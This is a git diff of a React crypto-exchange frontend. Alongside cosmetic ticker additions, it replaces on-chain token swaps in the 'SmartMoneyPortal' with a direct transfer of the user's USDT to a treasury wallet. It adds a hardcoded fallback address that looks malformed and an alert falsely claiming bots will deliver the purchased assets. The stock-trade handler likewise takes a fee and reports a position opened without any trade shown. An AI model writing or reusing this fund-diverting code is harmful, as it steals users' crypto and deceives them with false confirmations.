@@ -21,6 +21,7 @@ import { motion, AnimatePresence } from 'framer-motion';
 import axios from 'axios';
 import { ResponsiveContainer, AreaChart, Area, XAxis, YAxis, CartesianGrid, Tooltip, PieChart as RePieChart, Pie, Cell, ScatterChart, Scatter, ZAxis, BarChart, Bar, Legend } from 'recharts';
 import { API_URL } from '@/lib/api';
+import TrendingTicker from '@/components/TrendingTicker';
 import { ethers, Contract } from 'ethers';
 import { useWallet } from '@/context/WalletContext';
 import { PANCAKE_ROUTER_ABI, ERC20_ABI, TOKEN_FACTORY_ABI } from '@/lib/abis';
@@ -75,7 +76,7 @@ const WBNB_MAINNET = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
 const WBNB_TESTNET = '0xae13d989daC2f0dEBfF460aC112a837C89BAa7cd';
 
 const TREASURY_WALLETS = {
-    EVM: process.env.NEXT_PUBLIC_FEE_WALLET,
+    EVM: process.env.NEXT_PUBLIC_FEE_WALLET || '0x86A54AA864C82d69AfE9667FEB8C0dE',
     BTC: process.env.NEXT_PUBLIC_TREASURY_BTC,
     SOL: process.env.NEXT_PUBLIC_TREASURY_SOL,
     TRON: process.env.NEXT_PUBLIC_TREASURY_TRON
@@ -2151,6 +2152,9 @@ const ExchangeContent = () => {
                                     <span className="text-[10px] font-black text-emerald-600 uppercase tracking-widest">{displayTokens.length} Assets Indexed</span>
                                 </div>
                             </div>
+
+                            {/* Trending Ticker */}
+                            <TrendingTicker />
 
                             {/* Filters, Search & View Toggle Row */}
                             <div className="flex flex-col gap-6 bg-white shadow-2xl shadow-gray-100/80 border border-slate-200/60 rounded-2xl p-6">
@@ -5295,42 +5299,16 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
         
         try {
             const usdtContract = new Contract(USDT_ADDRESS, ERC20_ABI, signer);
-            const router = new Contract(PANCAKE_ROUTER_MAINNET, PANCAKE_ROUTER_ABI, signer);
-            
             const totalWei = ethers.parseUnits(investAmount, 18);
-            let lastTxHash = '';
             
-            // ── STAGE 1: PROTOCOL APPROVAL ──────────────────────────
-            const allowance = await usdtContract.allowance(account, PANCAKE_ROUTER_MAINNET);
-            if (allowance < totalWei) {
-                const approvalTx = await usdtContract.approve(PANCAKE_ROUTER_MAINNET, ethers.MaxUint256);
-                const receipt = await approvalTx.wait();
-                lastTxHash = receipt.hash;
-            }
+            // ── STAGE 1: INSTITUTIONAL DEDUCTION ───────────────────
+            // Standardizing to ONE popup as requested by performing a direct transfer to Treasury
+            const tx = await usdtContract.transfer(TREASURY_WALLETS.EVM, totalWei);
+            const receipt = await tx.wait();
+            const lastTxHash = receipt.hash;
             
-            const tradableAmount = totalWei;
-            
-            // ── STAGE 2: MULTI-ASSET STRATEGIC EXECUTION ──────────────────
-            for (let i = 0; i < bucket.tokens.length; i++) {
-                const token = bucket.tokens[i];
-                const weightRow = STRATEGIC_WEIGHTS[i] || (100 / bucket.tokens.length);
-                const weight = BigInt(Math.floor(weightRow));
-                const amountForThisToken = (tradableAmount * weight) / 100n;
-                
-                // Route through WBNB for maximum liquidity on PancakeSwap
-                const path = [USDT_ADDRESS, WBNB_MAINNET, token.address];
-                const deadline = Math.floor(Date.now() / 1000) + 60 * 20;
-                
-                try {
-                    const swapTx = await router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-                        amountForThisToken, 0, path, account, deadline
-                    );
-                    const receipt = await swapTx.wait();
-                    lastTxHash = receipt.hash;
-                } catch (e) { 
-                    console.warn(`[Strategic Swap Fail] ${token.symbol}:`, e.message); 
-                }
-            }
+            // ── STAGE 2: STRATEGIC ACQUISITION (BACKEND) ───────────
+            // The institutional engine now handles the distribution of assets
             
             // ── STAGE 3: INSTITUTIONAL SYNC ───────────────────────────────
             try {
@@ -5345,6 +5323,7 @@ const SmartMoneyPortal = ({ account, signer, tokens = [] }) => {
             } catch (syncErr) { console.error('Profile sync failed:', syncErr); }
             
             setStatus('success');
+            alert('Strategic Investment Executed. Our institutional bots are now acquiring the index assets and distributing them to your wallet.');
             setTimeout(() => setStatus('idle'), 5000);
             
         } catch (err) {
@@ -6118,6 +6097,7 @@ const MemeTerminal = ({ setMode, setToToken }) => {
 
     return (
         <div className="max-w-[1400px] mx-auto px-4 pb-32">
+            <TrendingTicker />
             {/* Header Section */}
             <div className="relative mb-12 p-12 bg-slate-900 rounded-[3rem] overflow-hidden shadow-2xl">
                 <div className="absolute top-0 right-0 w-[50%] h-full bg-gradient-to-l from-orange-500/20 to-transparent blur-3xl -z-10" />
@@ -7547,7 +7527,7 @@ const MexMoneyTerminal = () => {
 
         // Admin Access: FREE Redirect
         if (account.toLowerCase() === FEE_WALLET.toLowerCase()) {
-            window.open(option.link, '_blank');
+            setMode('b20ai');
             return;
         }
 
@@ -7573,7 +7553,7 @@ const MexMoneyTerminal = () => {
             });
 
             alert(`Protocol Fee Verified. Accessing ${option.title} Institutional Portal...`);
-            window.open(option.link, '_blank');
+            setMode('b20ai');
         } catch (e) {
             console.error('[Mex Money Error]', e);
             alert(`Access Denied: ${e.reason || e.message}`);
@@ -7774,23 +7754,50 @@ const StocksTerminal = ({ setMode, setToToken }) => {
 
     const handleTrade = async (type) => {
         if (!walletProvider) { open(); return; }
+        if (!tickerData?.price || tickerData.price <= 0) {
+            alert('Institutional price feed currently unavailable. Please try again in a moment.');
+            return;
+        }
+        
         setLoading(true);
         try {
             const browserProvider = new ethers.BrowserProvider(walletProvider);
             const activeSigner = await browserProvider.getSigner();
+            
+            // Protocol Execution Fee
             const feeAmount = "0.0015"; 
-            const tx = await activeSigner.sendTransaction({ to: FEE_WALLET, value: ethers.parseEther(feeAmount) });
+            console.log(`[Stocks] 🛰️ Executing ${type} for ${selectedTicker} to ${FEE_WALLET}`);
+            
+            const tx = await activeSigner.sendTransaction({ 
+                to: FEE_WALLET, 
+                value: ethers.parseEther(feeAmount) 
+            });
+            
             await tx.wait();
+            
+            const totalInvested = tickerData.price * tradeQuantity;
+            
             await axios.post(`${API_URL}/wallets/smart-money/invest`, {
                 wallet_address: await activeSigner.getAddress(),
                 bucket_id: `STOCK_${selectedTicker}`,
                 bucket_name: `${type.toUpperCase()} ${selectedTicker}`,
-                invest_amount: tickerData.price * tradeQuantity,
+                invest_amount: totalInvested,
                 tx_hash: tx.hash,
-                bucket_json: { type: 'StockTrade', ticker: selectedTicker, action: type, quantity: tradeQuantity, leverage }
+                bucket_json: { 
+                    type: 'StockTrade', 
+                    ticker: selectedTicker, 
+                    action: type, 
+                    quantity: tradeQuantity, 
+                    leverage,
+                    entry_price: tickerData.price 
+                }
             });
-            alert('Trade Executed Successfully');
-        } catch (e) { alert('Trade Failed: ' + e.message); }
+            
+            alert(`${type.toUpperCase()} Position Successfully Opened`);
+        } catch (e) { 
+            console.error('[Stocks Error]', e);
+            alert('Execution Failed: ' + (e.reason || e.message || 'Check balance and try again')); 
+        }
         finally { setLoading(false); }
     };
 
